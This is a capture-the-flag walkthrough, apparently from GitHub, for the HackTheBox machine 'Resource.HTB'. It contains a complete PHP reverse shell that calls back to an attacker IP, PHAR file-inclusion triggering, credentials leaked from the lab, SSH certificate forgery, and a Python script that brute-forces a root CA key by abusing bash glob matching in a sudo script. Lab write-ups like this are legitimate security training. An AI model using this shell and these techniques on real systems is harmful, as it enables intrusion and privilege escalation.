![pwn3d](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/image.png)

# Resource.HTB

## Recon

enumerating open ports with Rustscan 
```
rustscan -a 10.129.173.4 --ulimit 9000 -- -sC -A
```

![Rustscan](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/rustscan.png) 
![Rustscan2](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/rustscan2.png)


adding it to hosts file 
```
sudo nano /etc/hosts
```
whatweb scan redirects to http://itrc.ssg.htb/ adding it to hosts

![whatweb](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/whatweb.png)
it redirects to some IT support website with LOGIN and REGISTER and we know it is hosted with PHP 
lets explore user registration

![login](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/loggesin.png)

## Exploitation

it opens user registration and then redirects to dashboard where we can create tickets 

but we can only submit tickets with .zip extenstion 

or we can exploit the PHP file inclusion exploit by finding the stored file path and executing our shell code 

Referencing PHAR (PHP Archives) exploit by Hacktricks
Exploit ID - CVE-2023-41330

https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/file-inclusion/phar-deserialization.md
https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization

lets upload pentestmonkey's rev shell 


```php
//shell.php
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '10.10.14.23';  // You have changed this
  $port = 6969;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
```
make a zip file of shell.php

and upload as a ticket 

![loggedin](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/ticket.png)

Click on the ticket and copy the shell.zip file path 
```
http://itrc.ssg.htb/uploads/b1b6433555455fe26b08ad6b9290c333268597ec.zip
```
modify the above path with PHAR (PHP Archive) payload and open a netcat listner 
```
nc -lnvp 6969
```


so if your file name is shell.php then you should execute as "hash.zip/shell"

```
http://itrc.ssg.htb/?page=phar://uploads/b1b6433555455fe26b08ad6b9290c333268597ec.zip/shell
```
Voila got the reverse shell

in the home dir there are two users 
```
msainristil
zzinter
```

exploring the web dir in /var/www/itrc/
 found db.php with mysql db user pass

```php
cat db.php
<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}$ 
$
```


getting error while logging with jj
```
mysql -u jj -p
ugEG5rR5SG8uPd
ERROR 2002 (HY000): Can't connect to local server through socket '/run/mysqld/mysqld.sock' (2) 
```

so someone did a reset to the machine and i found there are two zips but i just uploaded my zip 
downloaded the zip file and explored it 

`c2f4813259cc57fab36b311c5058cf031cb6eb51.zip`


inside the zip file there is a long JSON log file 

and BAM!! we got the user ID and PASS in this
```json
         "headersSize": 647,
          "bodySize": 37,
          "postData": {
            "mimeType": "application/x-www-form-urlencoded",
            "text": "user=msainristil&pass=82yards2closeit",
            "params": [
              {
                "name": "user",
                "value": "msainristil"
              },
              {
                "name": "pass",
                "value": "82yards2closeit"
              }
            ]
          }
        },
```
![user pwn msainristil](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/ssh-user.png)

```msainristil:82yards2closeit```

Still no user flag 

but there are some ssh pub keypair in folder

```
msainristil@itrc:~/decommission_old_ca$ ls
ca-itrc  ca-itrc.pub
```

so both of the files are used signing and authorizing keys 

we need to create a key and sign it wil ca-itrc

```
ssh-keygen -t rsa -b 2048 -f sed
```
```bash
msainristil@itrc:~/decommission_old_ca$ ssh-keygen -t rsa -b 2048 -f sed
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in sed
Your public key has been saved in sed.pub
The key fingerprint is:
SHA256:PhpFb65XJID0Sz/pX09As2WoDltap0hW9g4RqpAEtRA msainristil@itrc
The key's randomart image is:
+---[RSA 2048]----+
|    E=+.    .    |
|     o.+.  . . . |
|      + +.. + + o|
|       + =.+.= = |
|        S Xo= =  |
|       o * X.= . |
|      . o *.o o .|
|       o o.. . o |
|      . ..  .   .|
+----[SHA256]-----+
msainristil@itrc:~/decommission_old_ca$ ls
ca-itrc  ca-itrc.pub  sed  sed.pub
```
we now have a dummy keypair now we have to sign it with ca-itrc with zzinter user

```bash
msainristil@itrc:~/decommission_old_ca$ ssh-keygen -s ca-itrc -n zzinter -I xx sed.pub 
Signed user key sed-cert.pub: id "xx" serial 0 for zzinter valid forever
```

lets login with the following keypair
```ssh -i sed  zzinter@resource.htb```

YESSSS!!! LOGGED IN WITH ZZINTER 

AND GOT THE USER FLAG

![user-flag](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/ssh-user2.png)

## Privilage Escalation


inside the user dir we have a file sign_key_api.sh 

```php
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```


this seems like an API for siginig public keys 
copying it to my local machine and lets see

it redirects to `signserv.ssg.htb/v1/sign`

adding it to hosts 
```
 nano /etc/hosts
``` 
 ran linpeas.sh and came to know that we're in a docker container need to escape to the host machine 

the machine hostname is "ssg"

running the file found in user's dir 'sign_key_api.sh '

![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-19-09.png)

```
chmod +x sign_key_api.sh
```

```
./sign_key_api.sh sed.pub support support > support.cert
```
![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-14-00.png)

Note: to run the api in your home machine or PWNBox you need to add signserv.ssg.htb to your '/etc/hosts' file

signing in with support.cert and supoort user
```
ssh support@resource.htb -p 2222 -i sed -o CertificateFile=support.cert 
```
![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-34-14.png)
we're in the support user in host machine i.e. 'ssg'

there are two users in home dir

support and zzinter 

ran linpeas and found ssh_principal file for 3 users root, zzinter and support

I remember ssh auth_principals while creating support certificate 

So after exploring /etc/ssh/auth_principals/zzinter

i found its rolename i.e. zzinter_temp 

![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-24-59.png)

putting the username and role in the user dir file i.e. sign_key_api.sh

after making changes to the sign key script 

![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-32-55.png)

run:

```
./sign_key_api.sh sed.pub zzinter zzinter_temp > zzinter.cert
```
got the access in zzinter@ssg machine using 

```
ssh zzinter@resource.htb -p 2222 -i sed -o CertificateFile=zzinter.cert 
```
![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-34-14.png)

checking permissions with sudo -l 
found we can execute  `/opt/sign_key.sh` file as root
 ![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-35-52.png)
 exploring the file 
 
 ```zzinter@ssg:~$ cat /opt/sign_key.sh ```
 ```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

if [[ $ca == "/etc/ssh/ca-it" ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"
```


so basically this file can real CA certificate file  and if the CA file matches the root CA file it will return error code 1

let me explain :

```
//lets take two strings a and b

#!/bin/bash

a="Hello I am Sed"
b="Hell*"

# Perform pattern matching
if [[ $a == $b ]]; then 
    echo 'a matches b'  # condition 1
else
    echo 'a does not match b'
fi

# Reverse check
if [[ $b == $a ]]; then
    echo 'b matches a'   # condition 2
else
    echo 'b does not match a'
fi

```
the first if statement, == checks for exact equality. Since "Hell*" is not equal to "Hello I am Sed", this condition will also be false. Because the condition is false, echo 'a==b' will not be executed.
But in the second statement 'Hell' is present the condition will be executed

wrote a python script to return the root CA certificate 


```python
import subprocess
import string

CA_PATH = '/tmp/ca-test'
SIGNING_SCRIPT = '/opt/sign_key.sh'
PUB_KEY = 'root.pub'
USER = 'root'
PRINCIPAL = 'root_user'
SERIAL = 'ABCD'

def run_signing_command(pattern):
    with open(CA_PATH, 'wb') as f:
        f.write(pattern.encode('utf-8'))

    try:
        result = subprocess.run(
            ['bash', '-c', f"echo -n '{pattern}' > {CA_PATH}; sudo {SIGNING_SCRIPT} {CA_PATH} {PUB_KEY} {USER} {PRINCIPAL} {SERIAL}"],
            capture_output=True,
            text=True
        )
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        print(f"Error running command: {e}")
        return "", str(e)

def brute_force_patterns(base_pattern=''):
    chars = string.ascii_letters + string.digits + '-+=/ \r\n'

    while True:
        found = False
        for char in chars:
            pattern = base_pattern + char + '*'

            stdout, stderr = run_signing_command(pattern)

            if "Error: Use API for signing with this CA." in stdout:
                base_pattern += char
                found = True
                print(f"{base_pattern}")
                break
        if not found:
            break
    return pattern

if __name__ == '__main__':
    ca_key = brute_force_patterns()
    if "-----END OPENSSH PRIVATE KEY-----" in ca_key:
        print("\n\nSuccess\n")
        file = open("ca-it", "w")
        file.write(ca_key)
        file.close()
    else:
        exit("\n\nFail\n") 
```
![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-56-23.png)

the exploit will take some time to bruteforce key file

after the successfully executing the script save the ssh private key in your local machine as root.key

then do 

```bash
ssh-keygen -f root
```

Edit the private key:
Open the private key file in a text editor:

```
nano root.key
```
Place the provided key content in the file:
```
chmod 600 root.key
```

https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2022-16-39.png
Sign the public key to create a certificate:
```

ssh-keygen -s root.key -z 200 -I root -V -10w:forever -n root_user root.pub
```

Finally Connect to the target machine using the signed certificate:


```ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub```

ANDDD WE GOT THE ROOT FLAGGG!!!!!
![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2022-17-09.png)

## Conclusion
Working through the 'Resource.HTB' machine was a challenging and rewarding experience that significantly enhanced my skills, pwning the 'Resource.HTB' machine took considerable time and effort, but the experience was invaluable. It taught me patience, persistence, and the necessity of a methodical approach to problem-solving in cybersecurity
